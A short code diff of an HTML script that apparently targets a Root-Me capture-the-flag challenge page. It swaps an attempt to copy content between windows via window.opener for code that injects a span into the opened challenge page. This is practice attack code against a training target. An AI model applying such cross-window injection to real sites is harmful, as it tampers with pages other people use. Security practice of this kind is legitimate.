@@ -12,8 +12,10 @@
 
 <script>
     function myFunc() {const wi = window.open("http://challenge01.root-me.org:58003/profile") ; 
-                       const test = wi.open("https://basloc.github.io/index.html");  
-                       wi.opener.document.getElementById("oui").innerHTML = test.opener.document.body.innerHTML;
+                       var newSpan = wi.document.createElement("span");
+                       newSpan.id = "monSpan"; // Définissez l'ID souhaité
+                       newSpan.textContent = "Contenu injecté dans Page1";
+                       wi.document.body.appendChild(newSpan);
                       }
 </script>
 
